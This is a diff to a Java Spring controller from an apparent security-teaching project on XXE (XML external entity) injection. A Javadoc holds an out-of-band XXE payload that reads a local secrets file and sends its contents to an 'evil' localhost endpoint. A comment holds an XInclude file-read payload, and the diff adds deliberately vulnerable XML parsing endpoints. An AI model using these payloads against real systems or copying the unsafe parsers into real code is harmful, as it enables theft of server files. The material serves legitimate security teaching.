@@ -4,6 +4,8 @@ import com.example.cwe.xml_injecions.pojo.User;
 import com.example.cwe.xml_injecions.pojo.Users;
 import org.dom4j.DocumentException;
 import org.dom4j.io.SAXReader;
+import org.jdom2.JDOMException;
+import org.jdom2.input.SAXBuilder;
 import org.springframework.http.HttpStatus;
 import org.springframework.http.MediaType;
 import org.springframework.web.bind.annotation.*;
@@ -14,12 +16,11 @@ import org.w3c.dom.NodeList;
 import org.xml.sax.InputSource;
 import org.xml.sax.SAXException;
 
+import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import javax.xml.XMLConstants;
 import javax.xml.bind.JAXB;
-import javax.xml.bind.JAXBContext;
 import javax.xml.bind.JAXBException;
-import javax.xml.bind.Unmarshaller;
 import javax.xml.parsers.DocumentBuilder;
 import javax.xml.parsers.DocumentBuilderFactory;
 import javax.xml.parsers.ParserConfigurationException;
@@ -30,32 +31,34 @@ import java.io.IOException;
 import java.io.StringReader;
 import java.util.UUID;
 
+/**
+ * Пример с загрузкой зловредного xml с сервера злоумышленника и последующей отправкой данных на его сервер
+ * Исходный xml:
+ * <?xml version="1.0" encoding="UTF-8"?>
+ * <!DOCTYPE foo [
+ * <!ENTITY % pe SYSTEM "http://localhost:7171/evil/xxe-file"> %pe; %param1;
+ * ]>
+ * <foo>&external;</foo>
+ * <p>
+ * xxe-file:
+ * <!ENTITY % payload SYSTEM "file:///c:/temp/secrets.txt">
+ * <!ENTITY % param1 "<!ENTITY external SYSTEM 'http://localhost:7171/evil/log-data?data=%payload;'>">
+ * <p>
+ * Вектора атак:
+ * <a href="https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/xxe-xee-xml-external-entity.md">...</a>
+ */
 @RestController
 @RequestMapping("xxe")
 public class XxeInjectionController {
     //TODO: XInclude attacks example!
 
     /**
-     * Пример с загрузкой зловредного xml с сервера злоумышленника и последующей отправкой данных на его сервер
-     * Исходный xml:
-     * <?xml version="1.0" encoding="UTF-8"?>
-     * <!DOCTYPE foo [
-     *         <!ENTITY % pe SYSTEM "http://localhost:7171/evil/xxe-file"> %pe; %param1;
-     *         ]>
-     * <foo>&external;</foo>
-     *
-     * xxe-file:
-     * <!ENTITY % payload SYSTEM "file:///c:/temp/secrets.txt">
-     * <!ENTITY % param1 "<!ENTITY external SYSTEM 'http://localhost:7171/evil/log-data?data=%payload;'>">
-     *
-     */
-
-
-    /**
      * javax.xml.bind.UnmarshalException - with linked exception: [org.xml.sax.SAXParseException]
      * External Entity: Failed to read external document 'secrets.txt', because 'file' access is not allowed due to
      * restriction set by the accessExternalDTD property.
      * По умолчанию поддержка file, http в XXE отключена. Нужно System.setProperty("javax.xml.accessExternalDTD", "all");
+     * Отключено с java 1.7:
+     * <a href="https://docs.oracle.com/javase/7/docs/api/javax/xml/XMLConstants.html#ACCESS_EXTERNAL_SCHEMA">...</a>
      * <p>
      * Отлично работает с не "system" сущностями
      */
@@ -74,7 +77,7 @@ public class XxeInjectionController {
     @PostMapping(value = "unmarshall-safe",
             consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
     @ResponseStatus(HttpStatus.CREATED)
-    public void unmarshallSafe(@RequestBody String xml, HttpServletResponse response) throws JAXBException, IOException, SAXException, ParserConfigurationException {
+    public void unmarshallSafe(@RequestBody String xml, HttpServletResponse response) throws IOException, SAXException, ParserConfigurationException {
         // Because javax.xml.bind.Unmarshaller parses XML but does not support any flags for disabling XXE, you must
         // parse the untrusted XML through a configurable secure parser first, generate a source object as a result,
         // and pass the source object to the Unmarshaller. For example:
@@ -174,6 +177,34 @@ public class XxeInjectionController {
 
         org.dom4j.Document document = saxReader.read(new InputSource(new StringReader(xml)));
         response.getWriter().write(document.asXML());
+    }
+
+
+    // Все что ниже - только для проверки XInclude, но не работает!
+    //    <?xml version="1.0" encoding="UTF-8"?>
+    //<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+    //    <xi:include parse="text" href="file:///c:/temp/secrets.txt"/>
+    //</foo>
+    @PostMapping(value = "saxbuild-unsafe",
+            consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
+    @ResponseStatus(HttpStatus.CREATED)
+    public void saxBuildUnsafe(@RequestBody String xml, HttpServletResponse response) throws ParserConfigurationException, IOException, SAXException, DocumentException, JDOMException {
+        SAXBuilder builder = new SAXBuilder();
+        org.jdom2.Document document = builder.build(new InputSource(new StringReader(xml)));
+        response.getWriter().write(document.toString());
+    }
+
+    @PostMapping(value = "spf-unsafe",
+            consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
+    @ResponseStatus(HttpStatus.CREATED)
+    public void spfUnsafe(@RequestBody String xml, HttpServletRequest request, HttpServletResponse response) throws ParserConfigurationException, IOException, SAXException, DocumentException, JDOMException {
+
+        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+        DocumentBuilder db = dbf.newDocumentBuilder();
+        InputSource is = new InputSource(request.getInputStream());
+        Document document = db.parse(new InputSource(new StringReader(xml)));  // parse xml
+
+        response.getWriter().write(document.toString());
     }
 
 
